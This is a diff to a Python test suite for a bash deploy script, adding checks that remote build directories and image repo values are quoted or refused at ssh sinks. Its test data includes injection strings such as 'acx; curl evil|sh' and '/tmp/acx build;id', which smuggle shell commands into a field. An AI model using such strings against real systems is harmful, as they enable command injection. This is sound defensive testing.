@@ -42,6 +42,7 @@ from __future__ import annotations
 import os
 import pathlib
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -450,25 +451,27 @@ def test_d1_remote_build_dir_injection_refused_before_ssh(tmp_path: pathlib.Path
 
 
 def test_d1_remote_build_dir_quoted_at_ssh_sink(tmp_path: pathlib.Path) -> None:
-    """S2-A-01: validated REMOTE_BUILD_DIR is single-quoted in the mkdir/cd sinks.
+    """S2-A-01: REMOTE_BUILD_DIR is quoted at every ssh sink.
 
-    Executes do_build_remote with stubs so the real ssh command strings are captured.
+    mkdir/rm single-quote the generation dir. The cd now happens inside the locked
+    build program, which receives the dir only as a remote_quote'd positional ($8)
+    of `flock ... bash -s --`, next to the remote_quote'd `.lock` path. Executes
+    do_build_remote with stubs so the real ssh command strings are captured, then
+    replays the locked command through a real shell to read the argv it yields.
     """
     bindir = tmp_path / "bin"
     bindir.mkdir()
     ssh_log = tmp_path / "ssh.log"
-    ssh_log.write_text("")
-    # ssh stub: log remote command payload (last arg) and succeed for preflight checks.
+    program_file = tmp_path / "program.sh"
+    # ssh stub: log remote command payload (last arg); keep the locked program (stdin).
     (bindir / "ssh").write_text(
         textwrap.dedent(
             f"""\
             #!/bin/sh
-            # Log every remote command string (last argv) for sink inspection.
             for a in "$@"; do last="$a"; done
             printf '%s\\n' "$last" >> "{ssh_log}"
-            # Free-space preflight parses df output from a remote command.
             case "$last" in
-              *df*) echo 20 ;;
+              *"bash -s --"*) cat > "{program_file}" ;;
             esac
             exit 0
             """
@@ -479,54 +482,100 @@ def test_d1_remote_build_dir_quoted_at_ssh_sink(tmp_path: pathlib.Path) -> None:
     (bindir / "rsync").chmod(0o755)
     (bindir / "docker").write_text("#!/bin/sh\nexit 0\n")
     (bindir / "docker").chmod(0o755)
+    flockbin = tmp_path / "flockbin"
+    flockbin.mkdir()
+    flock_argv = tmp_path / "flock.argv"
+    (flockbin / "flock").write_text(f'#!/bin/sh\nprintf "%s\\n" "$@" > "{flock_argv}"\n')
+    (flockbin / "flock").chmod(0o755)
 
     safe_dir = "/tmp/acx-build-safe"
-    env = os.environ.copy()
-    env["PATH"] = f"{bindir}:{env['PATH']}"
-    env["ACX_REMOTE_BUILD_DIR"] = safe_dir
-    env["REMOTE_BUILD"] = "1"
-    # Source and call do_build_remote with preflight stubs that still exercise ssh sinks.
-    script = textwrap.dedent(
-        f"""\
-        source "{DEPLOY_SCRIPT}"
-        preflight_ssh() {{ :; }}
-        preflight_remote_docker() {{ :; }}
-        preflight_rsync() {{ :; }}
-        remote_builder_prune() {{ :; }}
-        # assert_remote_build_free_space uses ssh; leave real so sink log captures it too,
-        # but override to skip the numeric gate if parse fails.
-        assert_remote_build_free_space() {{ :; }}
-        do_build_remote dev
-        """
-    )
-    proc = subprocess.run(
-        ["bash", "-c", script],
-        check=False,
-        capture_output=True,
-        text=True,
-        env=env,
-        timeout=30,
-    )
-    assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
-    payloads = ssh_log.read_text()
+
+    def run_build(preamble: str) -> tuple[list[str], list[str]]:
+        ssh_log.write_text("")
+        env = os.environ.copy()
+        env["PATH"] = f"{bindir}:{env['PATH']}"
+        env["ACX_REMOTE_BUILD_DIR"] = safe_dir
+        env["REMOTE_BUILD"] = "1"
+        script = "\n".join(
+            [
+                f'source "{DEPLOY_SCRIPT}"',
+                "preflight_ssh() { :; }",
+                "preflight_remote_docker() { :; }",
+                "preflight_rsync() { :; }",
+                "assert_remote_build_free_space() { :; }",
+                preamble,
+                "do_build_remote dev",
+            ]
+        )
+        proc = subprocess.run(
+            ["bash", "-c", script],
+            check=False,
+            capture_output=True,
+            text=True,
+            env=env,
+            timeout=30,
+        )
+        assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+        payloads = ssh_log.read_text().splitlines()
+        locked = [p for p in payloads if " bash -s -- " in p]
+        assert len(locked) == 1, payloads
+        # OpenSSH hands the string to the remote login shell; replay it the same way.
+        replay_env = os.environ.copy()
+        replay_env["PATH"] = f"{flockbin}:{replay_env['PATH']}"
+        replay = subprocess.run(
+            ["bash", "-c", locked[0]],
+            check=False,
+            capture_output=True,
+            text=True,
+            env=replay_env,
+            stdin=subprocess.DEVNULL,
+            timeout=15,
+        )
+        assert replay.returncode == 0, f"locked={locked[0]!r} stderr={replay.stderr!r}"
+        return payloads, flock_argv.read_text().splitlines()
+
+    payloads, argv = run_build("")
     # OCIRV-1 fences each deploy into its own generation directory
     # (`${REMOTE_BUILD_DIR}-<sha12>-<epoch>-<pid>-<random>`) so one coordinator's
-    # `rsync --delete` cannot rewrite another's build context. D1's contract is the
-    # *quoting at the ssh sink*, not the literal directory name, so pin the quoted
-    # form and tolerate the generation suffix.
-    gen_dir = re.escape(safe_dir) + r"[A-Za-z0-9._/-]*"
-    assert re.search(rf"mkdir -p -- '{gen_dir}'", payloads), payloads
-    assert re.search(rf"cd -- '{gen_dir}'", payloads), payloads
-    assert re.search(rf"rm -rf -- '{gen_dir}'", payloads), payloads
-    # Every occurrence of the build dir (generation dir, and the `.lock` sibling
-    # derived from REMOTE_BUILD_DIR) must be single-quoted at the sink; an unquoted
+    # `rsync --delete` cannot rewrite another's build context.
+    gen_dir = re.escape(safe_dir) + r"-[0-9a-f]{12}-[0-9]+-[0-9]+-[0-9]+"
+    mkdir = [m for p in payloads if (m := re.fullmatch(rf"mkdir -p -- '({gen_dir})'", p))]
+    assert len(mkdir) == 1, payloads
+    generation = mkdir[0].group(1)
+    assert f"rm -rf -- '{generation}'" in payloads, payloads
+    # flock -w N <lock> bash -s -- $1..$8; the program cds to $8.
+    assert len(argv) == 14 and argv[3:6] == ["bash", "-s", "--"], argv
+    assert argv[2] == f"{safe_dir}.lock", argv
+    assert argv[13] == generation, argv
+    program = program_file.read_text()
+    assert 'acx_build_dir="${8:-}"' in program
+    assert 'cd -- "$acx_build_dir"' in program
+    assert safe_dir not in program, "build dir must reach the program as argv, not text"
+    # Outside the locked command every occurrence must be single-quoted; an unquoted
     # occurrence is the original injection regression.
-    occurrences = [m.start() for m in re.finditer(re.escape(safe_dir), payloads)]
-    assert occurrences, payloads
-    for start in occurrences:
-        assert start > 0 and payloads[start - 1] == "'", payloads
-        token = payloads[start : payloads.index("'", start)]
-        assert re.fullmatch(rf"{gen_dir}", token), token
+    for payload in payloads:
+        if " bash -s -- " in payload:
+            assert payload.count(safe_dir) == 2, payload
+            continue
+        for match in re.finditer(re.escape(safe_dir), payload):
+            start = match.start()
+            assert start > 0 and payload[start - 1] == "'", payload
+            assert payload[start : payload.index("'", start)] == generation, payload
+
+    # Allowlist-slip control: with the charset gate bypassed, a dir carrying a space
+    # and `;` must still reach the locked program as whole argv words. With a
+    # charset-valid dir, remote_quote is a no-op, so only this run proves it is applied.
+    hostile = "/tmp/acx build;id"
+    _, slip_argv = run_build(
+        "assert_safe_shell_token() { :; }\n"
+        f"REMOTE_BUILD_DIR={shlex.quote(hostile)}\n"
+        'REMOTE_BUILD_LOCK="${REMOTE_BUILD_DIR}.lock"'
+    )
+    assert len(slip_argv) == 14, slip_argv
+    assert slip_argv[2] == f"{hostile}.lock", slip_argv
+    assert re.fullmatch(
+        re.escape(hostile) + r"-[0-9a-f]{12}-[0-9]+-[0-9]+-[0-9]+", slip_argv[13]
+    ), slip_argv
 
 
 def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
@@ -747,7 +796,13 @@ def test_d8_remote_build_uses_vlm_gate_after_case_fold(tmp_path: pathlib.Path) -
     assert f"need {vlm_floor}GB" in combined
     assert "target=runtime-vlm" in combined
     payloads = ssh_log.read_text()
-    assert payloads.index("docker builder prune") < payloads.index("df -BG")
+    assert "df -BG" in payloads
+    # ocir-landing-1 (d5f04944d): no host-wide prune on the prod-serving VM;
+    # only the isolated builder's cache is pruned, inside the build lock.
+    assert "docker builder prune" not in payloads
+    locked = (DEPLOY_SCRIPT.parent / "lib" / "bounded-remote-build.sh").read_text()
+    prune = locked.index('docker buildx prune \\\n  --builder "$acx_builder"')
+    assert prune < locked.index("acx_build_args=(")
 
 
 def _assert_safe_image_repo_body() -> str:
@@ -884,41 +939,84 @@ def test_d4_boot_smoke_emits_real_entrypoint_and_cache_mount(
     assert "/data/cache:ro" in captured
     assert "ACX_MODELS_PATH" in captured
     # Deploy still promotes SHA before env tag after smoke (structural order).
+    # do_deploy delegates the ship to _ship_selected_env, which owns the order.
     deploy_script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
-    deploy_body = deploy_script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
-    assert deploy_body.index("do_push_sha") < deploy_body.index("promote_gate") < deploy_body.index(
-        "do_push_tag"
-    )
+
+    def _function_body(name: str) -> str:
+        m = re.search(
+            rf"^{re.escape(name)}\(\) \{{\n(?P<body>.*?)^\}}$",
+            deploy_script,
+            re.DOTALL | re.MULTILINE,
+        )
+        assert m, f"{name} must exist"
+        return m.group("body")
+
+    assert re.search(
+        r'(?m)^\s*_ship_selected_env "\$env" aggregate\s*$', _function_body("do_deploy")
+    ), "do_deploy must ship through _ship_selected_env (aggregate)"
+    ship_body = _function_body("_ship_selected_env")
+    call_offsets = []
+    for call in (r"do_push_sha\s*$", r'promote_gate "\$env" ', r'if ! do_push_tag "\$tag" '):
+        m = re.search(rf"(?m)^\s*{call}", ship_body)
+        assert m, f"_ship_selected_env must call {call!r}"
+        call_offsets.append(m.start())
+    assert call_offsets == sorted(call_offsets), call_offsets
 
 
 def test_d6_ship_remote_image_repo_env_emits_sudo_upsert(
     tmp_path: pathlib.Path,
 ) -> None:
-    """D6 behavioural: ship_remote_image_repo_env ssh payload uses sudo + trailing NL."""
+    """D6 behavioural: ship_remote_image_repo_env ssh payload uses sudo + trailing NL.
+
+    The upsert is a program carried inside the ssh payload, so the ssh stub runs
+    that payload against a local .env (sudo stubbed to record and exec) and the
+    resulting file is asserted rather than the program's spelling.
+    """
     bindir = tmp_path / "bin"
     bindir.mkdir()
     ssh_log = tmp_path / "ssh.log"
     ssh_log.write_text("")
+    sudo_log = tmp_path / "sudo.log"
+    sudo_log.write_text("")
     (bindir / "ssh").write_text(
         textwrap.dedent(
             f"""\
             #!/bin/sh
             for a in "$@"; do last="$a"; done
             printf '%s\\n' "$last" >> "{ssh_log}"
-            exit 0
+            exec bash -c "$last"
             """
         )
     )
     (bindir / "ssh").chmod(0o755)
+    (bindir / "sudo").write_text(
+        textwrap.dedent(
+            f"""\
+            #!/bin/sh
+            printf '%s\\n' "$1" >> "{sudo_log}"
+            exec "$@"
+            """
+        )
+    )
+    (bindir / "sudo").chmod(0o755)
+    remote_dir = tmp_path / "remote"
+    remote_dir.mkdir()
+    prior_repo = "iad.ocir.io/idu2kqqe2jxy/acx-backend"
+    # Last line deliberately lacks a trailing newline.
+    (remote_dir / ".env").write_bytes(
+        f"ACX_IMAGE_REPO={prior_repo}\nACX_IMAGE_TAG=dev".encode("ascii")
+    )
 
     env = os.environ.copy()
     env["PATH"] = f"{bindir}:{env['PATH']}"
     safe_repo = "iad.ocir.io/idu2kqqe2jxy/acx-backend-vlm"
+    # Same claim-then-ship sequence as promote_gate.
     script = textwrap.dedent(
         f"""\
         source "{DEPLOY_SCRIPT}"
         ACX_IMAGE_REPO={safe_repo!r}
-        ship_remote_image_repo_env "/opt/acx-backend/dev"
+        ACX_IMAGE_REPO_OWNER_ID="$(image_repo_resource claim "{remote_dir}" "" "")"
+        ship_remote_image_repo_env "{remote_dir}"
         """
     )
     proc = subprocess.run(
@@ -927,14 +1025,18 @@ def test_d6_ship_remote_image_repo_env_emits_sudo_upsert(
         capture_output=True,
         text=True,
         env=env,
-        timeout=15,
+        timeout=30,
     )
     assert proc.returncode == 0, f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
-    payload = ssh_log.read_text()
-    assert "sudo" in payload, payload
-    assert "tail -c1" in payload, payload
-    assert "tee -a" in payload or "ACX_IMAGE_REPO=" in payload, payload
-    assert safe_repo in payload, payload
+    assert safe_repo in ssh_log.read_text(), ssh_log.read_text()
+    assert sudo_log.read_text().splitlines() == ["python3", "python3"], sudo_log.read_text()
+    content = (remote_dir / ".env").read_bytes()
+    assert content.endswith(b"\n"), content
+    lines = content.split(b"\n")
+    assert b"ACX_IMAGE_TAG=dev" in lines, content
+    assert [line for line in lines if line.startswith(b"ACX_IMAGE_REPO=")] == [
+        f"ACX_IMAGE_REPO={safe_repo}".encode("ascii")
+    ], content
 
     # Charset gate is live on the ship path: evil repo must not reach ssh.
     ssh_log.write_text("")
@@ -942,7 +1044,7 @@ def test_d6_ship_remote_image_repo_env_emits_sudo_upsert(
         f"""\
         source "{DEPLOY_SCRIPT}"
         ACX_IMAGE_REPO='iad.ocir.io/ns/acx; curl evil|sh'
-        ship_remote_image_repo_env "/opt/acx-backend/dev"
+        ship_remote_image_repo_env "{remote_dir}"
         """
     )
     evil = subprocess.run(
@@ -1146,8 +1248,8 @@ def test_run_with_deadline_forwards_stdin_to_the_bounded_command(
     """A bounding wrapper may add a deadline; it may not change what the child reads.
 
     run_with_deadline backgrounds its child, and a non-interactive shell gives a
-    backgrounded job /dev/null on stdin. Before the fd-3 passthrough, every
-    heredoc attached to a wrapped call was silently discarded -- including
+    backgrounded job /dev/null on stdin. Before the explicit `<&0` passthrough,
+    every heredoc attached to a wrapped call was silently discarded -- including
     do_boot_smoke's SMOKE script piped to `ssh ... bash -s`, where the remote
     shell read EOF, ran zero gates and exited 0. That is a fail-open pre-promote
     gate, so this contract is pinned directly rather than only through D4.
@@ -1161,7 +1263,7 @@ def test_run_with_deadline_forwards_stdin_to_the_bounded_command(
 
     # Mutation control: strip the passthrough and the payload must vanish.
     # Without this the assertions above could pass for the wrong reason.
-    mutated = original.replace('exec 3<&0\n  "$@" <&3 &', '"$@" &', 1)
+    mutated = original.replace('"$@" <&0 &', '"$@" &', 1)
     assert mutated != original, "stdin passthrough anchor not found"
     bad = _run_with_deadline_stdin_probe(mutated, tmp_path / "bad")
     assert "gate-line-one" not in bad.stdout
